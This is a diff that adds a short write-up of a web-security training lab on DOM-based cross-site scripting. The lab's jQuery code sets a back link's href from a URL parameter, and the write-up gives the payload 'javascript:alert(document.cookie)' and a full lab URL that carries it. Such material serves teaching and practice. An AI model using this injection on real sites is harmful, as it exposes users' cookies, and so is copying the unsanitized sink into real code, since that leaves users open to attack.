@@ -1,0 +1,14 @@
+This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
+
+To solve this lab, make the "back" link alert document.cookie.
+
+
+$(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+
+payload: javascript:alert(document.cookie)
+
+<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
+
+https://0a51008c04a8aaf7c06aebc400ef0057.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
